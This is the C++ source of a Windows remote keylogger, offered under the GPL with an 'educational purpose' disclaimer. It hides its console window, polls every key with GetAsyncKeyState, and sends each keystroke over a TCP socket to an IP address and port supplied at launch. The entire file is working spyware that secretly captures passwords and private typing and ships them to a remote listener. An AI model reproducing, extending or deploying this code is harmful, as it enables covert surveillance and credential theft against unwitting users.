/* this is a basic remote keylogger for eductional purpose written by mahmoud adel facebook link: https://www.facebook.com/mahmoudadel0x
and licensed under GNU GPL V3 use it at your own risk and responsibility, i am not responsible for any damage or any LAW break
this software is stable and can run in any windows version support the win32 library calls included
*/
//headers
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <string.h>
#include <winuser.h>
//global variables
WSADATA wsa;
SOCKET s; //socket HANDLE define in win32
struct sockaddr_in server;
const char *keylog; // variable to carry logged characters
using namespace std;
bool SpecialKeys(int S_Key) { // defined virtualkeys
	switch (S_Key) {
    case VK_MENU:
        keylog = "ALT";
        return true;
    case VK_CONTROL:
        keylog = "CTRL";
        return true;
    case VK_CAPITAL:
        keylog = "CAPS LOCK";
        return true;
	case VK_SPACE:
		keylog = " ";
		return true;
	case VK_RETURN:
		keylog = "\n";
		return true;
    case VK_ESCAPE:
        keylog = "ESCAPE";
        return true;
    case VK_PRIOR:
        keylog = "Page UP";
        return true;
    case VK_NEXT:
        keylog = "Page Down";
        return true;
    case VK_DELETE:
        keylog = "Deletekey";
        return true;
    case VK_SNAPSHOT:
        keylog = "printscreen";
        return true;
	case VK_OEM_PERIOD:
		 keylog = ".";
		return true;
	case VK_SHIFT:
		keylog = "#SHIFT#";
		return true;
	case VK_BACK:
		keylog = "\b";
		return true;
	case VK_RBUTTON:
		keylog = "#R_CLICK#";
		return true;
    case VK_OEM_PLUS:
        keylog = "=";
        return true;
    case VK_OEM_COMMA:
        keylog = ",";
        return true;
    case VK_OEM_MINUS:
        keylog = "-";
        return true;
    case VK_OEM_1:
        keylog = ";";
        return true;
    case VK_OEM_2:
        keylog = "?";
        return true;
    case VK_OEM_3:
        keylog = "`";
        return true;
    case VK_OEM_4:
        keylog = "[";
        return true;
    case VK_OEM_5:
        keylog = "'\'";
        return true;
    case VK_OEM_6:
        keylog = "]";
        return true;
    case VK_OEM_7:
        keylog = "'";
        return true;
    case VK_TAB:
        keylog = "tab";
        return true;
    default:
		return false;
	}
}
int senddata(const char* msg){

if( send(s , msg , strlen(msg) , 0) < 0) //check if data was send successfully
    {
        exit(1);
    }
 return 0;
    }
    //main function
int main(int argc, char* argv[]){
if (argc < 3){
printf("Error required 2 arguments");
exit(1);
}
const char *ipaddr = argv[1] ; //take user argument
char *f; //for conversion
u_short portn = strtoul(argv[2],&f,10); //convert char in input argument to unsigned int
if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
    {
        printf("Failed. Error Code : %d",WSAGetLastError()); //check is socket init was failed
        return 1;
    }
if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
    {
        printf("Could not create socket : %d" , WSAGetLastError()); //check if socket cannot be created
    }
    //win32 socket structure
server.sin_addr.s_addr = inet_addr(ipaddr);
server.sin_family = AF_INET;
server.sin_port = htons( portn );

    //Connect to remote server
int conn = connect(s , (struct sockaddr *)&server , sizeof(server)); //connection call
   if (conn == 1) //check if connection succed
   {
   printf("Connection failed with %s",ipaddr);
   exit(1);
   }
ShowWindow(GetConsoleWindow(), SW_HIDE); //hide window and work background
char KEY = 'x';
while (true) { //looop
     for (int KEY = 8; KEY <= 190; KEY++)
		{ //get the key
	if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) { //check special key
                    keylog = new char(KEY);
                    senddata(keylog); //write data to socket
                    }
                if (SpecialKeys(KEY) == true){
                    senddata(keylog);
                }
            }
        }
    }
}
